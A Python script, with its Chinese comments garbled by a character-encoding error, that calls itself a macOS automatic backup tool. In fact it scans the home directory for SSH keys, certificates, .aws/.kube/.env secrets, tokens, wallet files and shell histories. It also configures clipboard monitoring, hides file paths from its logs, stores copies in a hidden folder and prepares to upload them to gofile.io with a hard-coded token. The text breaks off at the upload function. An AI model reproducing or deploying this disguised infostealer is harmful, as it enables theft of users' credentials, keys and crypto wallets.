# -*- coding: utf-8 -*-
"""
Macè‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½Macç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import shutil
import time
import socket
import logging
import tarfile
import threading
import requests
import subprocess
import getpass
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç½‘ç»œé…ç½®
    NETWORK_TIMEOUT = 3  # ç½‘ç»œæ£€æŸ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰
    CLIPBOARD_INTERVAL = 1200  # ZTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰
    CLIPBOARD_CHECK_INTERVAL = 3  # ZTBæ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 60  # ZTBä¸Šä¼ æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    SCAN_TIMEOUT = 600  # æ‰«æç›®å½•è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_RETRY_COUNT = 3  # æ–‡ä»¶è®¿é—®é‡è¯•æ¬¡æ•°
    FILE_RETRY_DELAY = 5  # æ–‡ä»¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    COPY_CHUNK_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶å—å¤§å°ï¼ˆ1MBï¼Œæé«˜æ€§èƒ½ï¼‰
    PROGRESS_INTERVAL = 10  # è¿›åº¦æ˜¾ç¤ºé—´éš”ï¼ˆç§’ï¼‰
    
    # ä¸Šä¼ é…ç½®
    MAX_SERVER_RETRIES = 2  # æ¯ä¸ªæœåŠ¡å™¨æœ€å¤šå°è¯•æ¬¡æ•°
    FILE_DELAY_AFTER_UPLOAD = 1  # ä¸Šä¼ åç­‰å¾…æ–‡ä»¶é‡Šæ”¾çš„æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_DELETE_RETRY_COUNT = 3  # æ–‡ä»¶åˆ é™¤é‡è¯•æ¬¡æ•°
    FILE_DELETE_RETRY_DELAY = 2  # æ–‡ä»¶åˆ é™¤é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    
    # é”™è¯¯å¤„ç†é…ç½®
    CLIPBOARD_ERROR_WAIT = 60  # ZTBç›‘æ§è¿ç»­é”™è¯¯ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    BACKUP_CHECK_INTERVAL = 3600  # å¤‡ä»½æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼Œæ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡ï¼‰
    ERROR_RETRY_DELAY = 60  # å‘ç”Ÿé”™è¯¯æ—¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    MAIN_ERROR_RETRY_DELAY = 300  # ä¸»ç¨‹åºé”™è¯¯é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼Œ5åˆ†é’Ÿï¼‰
    
    # ç£ç›˜ç©ºé—´æ£€æŸ¥
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # æœ€å°å¯ç”¨ç©ºé—´ï¼ˆ1GBï¼‰
    
    # å¤‡ä»½ç›®å½• - ç”¨æˆ·ä¸»ç›®å½•
    BACKUP_ROOT = os.path.expanduser('~/Documents/.AutoBackup')
    
    # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£ç±»
        # æ–‡æœ¬å’Œæ–‡æ¡£
        ".txt", ".rtf", ".md", ".markdown", ".rst", ".tex", ".doc", ".docx", ".pages",
        # ç”µå­è¡¨æ ¼
        ".xls", ".xlsx", ".numbers", ".csv", ".tsv",
        # ä»£ç æ–‡ä»¶
        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".sh", ".bash", ".zsh", ".sol", ".rs", 
        # é…ç½®æ–‡ä»¶
        ".json", ".yaml", ".yml", ".xml", ".plist", ".conf", ".config", ".ini",
        # æ•°æ®æ–‡ä»¶
        ".wallet", ".bin"
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        # å¯†é’¥å’Œè¯ä¹¦
        ".pem", ".key", ".pub", ".crt", ".cer", ".der", ".p12", ".pfx",
        ".keystore", ".jks", ".asc", ".gpg", ".pgp",
        # SSHç›¸å…³
        "id_rsa", "id_ecdsa", "id_ed25519", ".ssh",
        # äº‘æœåŠ¡é…ç½®
        ".aws", ".kube", ".docker", ".gitconfig",
        # å…¶ä»–å®‰å…¨ç›¸å…³
        ".env", ".secret", ".token", ".credential"
    ]   
    
    # å¤‡ç”¨ä¸Šä¼ æœåŠ¡å™¨
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]
    
    # æŒ‡å®šè¦ç›´æ¥å¤åˆ¶çš„ç›®å½•å’Œæ–‡ä»¶
    MACOS_SPECIFIC_DIRS = [
        ".ssh",               # SSHé…ç½®
        ".bash_history",      # Bashå†å²è®°å½•
        ".python_history",    # Pythonå†å²è®°å½•
        ".node_repl_history", # Node.js REPL å†å²è®°å½•
        ".wget-hsts",         # wget HSTS å†å²è®°å½•
        ".Xauthority",        # Xauthority æ–‡ä»¶
        ".ICEauthority",      # ICEauthority æ–‡ä»¶
        ".zsh_history",       # Zshå†å²è®°å½•
        ".zsh_sessions"       # Zshä¼šè¯
    ]

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "MwFiLnOTlQrmQv5LBC1nYiLS5fofF8Po"
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                    if isinstance(record.msg, str):
                        msg = record.msg
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if msg.startswith("æ‰«æç›®å½•:") or msg.startswith("æ’é™¤ç›®å½•:"):
                                return super().format(record)
                            return None
                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if record.msg.startswith("æ‰«æç›®å½•:") or record.msg.startswith("æ’é™¤ç›®å½•:"):
                                return True
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        åªæ’é™¤ä¸»ç›®å½•ä¸‹çš„æŒ‡å®šä¸€çº§ç›®å½•ï¼Œå…¶å®ƒç›®å½•ä¸€å¾‹ä¸æ’é™¤ã€‚
        """
        # ä¼˜å…ˆæ’é™¤ AutoBackup ç›®å½•è‡ªèº«ï¼Œé¿å…è‡ªæˆ‘å¤‡ä»½
        backup_root = os.path.abspath(self.config.BACKUP_ROOT)
        abspath = os.path.abspath(path)
        if abspath.startswith(backup_root):
            return True
        # è·å–ä¸»ç›®å½•ç»å¯¹è·¯å¾„
        home_dir = os.path.abspath(os.path.expanduser('~'))
        # åªæ’é™¤ä¸»ç›®å½•ä¸‹çš„è¿™äº›ä¸€çº§ç›®å½•
        exclude_names = [
            '.cursor', '.zsh_sessions', 'Applications', 'Library', 'Movies', 'Music', 'Pictures', '.docker', '.rustup',
            '.npm', '.nvm', '.local', '.cargo', '.dotnet', 'venv', '.gradle', '.pki'
        ]
        # åˆ¤æ–­æ˜¯å¦ä¸ºä¸»ç›®å½•ä¸‹çš„ä¸€çº§ç›®å½•
        for name in exclude_names:
            exclude_path = os.path.join(home_dir, name)
            if abspath == exclude_path:
                return True
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """ç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        # ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS
        if extensions_type == 4:
            if self.config.DEBUG_MODE:
                logging.debug("ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS")
            self.backup_specified_files(source_dir, target_dir)
            # ç»§ç»­åç»­å¤‡ä»½é€»è¾‘

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½ç›®å½•:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")
            logging.debug(f"æ‰©å±•åç±»å‹: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        # åŸæœ‰çš„æ–‡ä»¶ç±»å‹å¤‡ä»½é€»è¾‘
        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"ä½¿ç”¨çš„æ–‡ä»¶æ‰©å±•å: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # å·²æ‰«æç›®å½•æ•°
        excluded_dirs = 0   # å·²æ’é™¤ç›®å½•æ•°
        skipped_files = 0   # è·³è¿‡çš„æ–‡ä»¶æ•°
        matched_files = 0   # åŒ¹é…çš„æ–‡ä»¶æ•°

        # macOS ç‰¹å®šæ–‡ä»¶ç±»å‹
        macos_file_types = {
            'numbers': ['numbers', 'spreadsheet'],
            'pages': ['pages', 'document'],
            'keynote': ['keynote', 'presentation'],
            'textedit': ['textedit', 'text'],
            'preview': ['preview', 'image'],
            'pdf': ['pdf', 'document'],
            'rtf': ['rtf', 'document'],
            'rtfd': ['rtfd', 'document']
        }

        # macOS iWork æ–‡æ¡£ MIME ç±»å‹ï¼ˆå»é™¤ keynoteï¼‰
        macos_mime_types = {
            'pages': ['application/x-iwork-pages-sffpages'],
            'numbers': ['application/x-iwork-numbers-sffnumbers'],
        }
        # çº¯æ–‡æœ¬ç±»å‹
        plain_text_types = ['text/plain', 'text/x-env', 'text/rtf']

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"âŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # å®šæœŸæ˜¾ç¤ºè¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"â³ å·²æ‰«æ {scanned_dirs} ä¸ªç›®å½•ï¼Œæ’é™¤ {excluded_dirs} ä¸ªç›®å½•")
                        logging.debug(f"â³ å½“å‰æ‰«æ: {root}")
                        logging.debug(f"â³ å·²åŒ¹é… {matched_files} ä¸ªæ–‡ä»¶ï¼Œè·³è¿‡ {skipped_files} ä¸ªæ–‡ä»¶")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # åªå¯¹å­ç›®å½•åšæ’é™¤åˆ¤æ–­ï¼Œæ ¹ç›®å½•ä¸æ’é™¤
                if root != source_dir and self.should_exclude_dir(root):
                    excluded_dirs += 1
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    file_lower = file.lower()
                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶ç±»å‹
                    should_backup = False
                    
                    # 1. æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
                    if any(file_lower.endswith(ext.lower()) for ext in extensions):
                        should_backup = True
                    else:
                        # 2. åªå¯¹æ— æ‰©å±•åæ–‡ä»¶åšç±»å‹æ£€æµ‹
                        if '.' not in file:
                            try:
                                file_type = subprocess.check_output(['file', '-b', '--mime-type', source_file]).decode('utf-8').strip()
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶ç±»å‹æ£€æµ‹: {file} -> {file_type}")
                                # åªè¯†åˆ« pages/numbers
                                for type_key, mime_list in macos_mime_types.items():
                                    if file_type in mime_list:
                                        should_backup = True
                                        if self.config.DEBUG_MODE:
                                            logging.debug(f"åŒ¹é…åˆ° macOS iWork æ–‡ä»¶ç±»å‹: {file} -> {type_key}")
                                        break
                                # è¯†åˆ«çº¯æ–‡æœ¬å’Œenvç±»å‹
                                if file_type in plain_text_types:
                                    should_backup = True
                                    if self.config.DEBUG_MODE:
                                        logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶è¯†åˆ«ä¸ºæ–‡æœ¬ç±»å‹: {file} -> {file_type}")
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶ç±»å‹æ£€æµ‹å¤±è´¥: {source_file} - {str(e)}")
                    
                    if not should_backup:
                        skipped_files += 1
                        continue

                    matched_files += 1
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡ç©ºæ–‡ä»¶: {source_file}")
                            skipped_files += 1
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡å¤§æ–‡ä»¶: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            skipped_files += 1
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥: {source_file} - {str(e)}")
                        skipped_files += 1
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶è®¿é—®å¤±è´¥: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    skipped_files += 1
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"åˆ›å»ºç›®æ ‡å­ç›®å½•å¤±è´¥: {target_sub_dir}")
                                skipped_files += 1
                                break
                                
                            # ä½¿ç”¨ä¼˜åŒ–çš„åˆ†å—å¤åˆ¶ï¼ˆ1MBå—å¤§å°ï¼‰
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶: {source_file} -> {target_file}")
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"âŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {source_file} - {str(e)}")
                                skipped_files += 1

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")
        except Exception as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            logging.info(f"\nğŸ“Š å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   ğŸ“‚ æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"   ğŸš« æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"   â­ï¸ è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"   âœ… åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"æ‰«æç»Ÿè®¡:")
                logging.debug(f"- æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"- æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"- è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"- åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # åˆ é™¤åŸå§‹å¤§æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # æ¸…ç†åˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
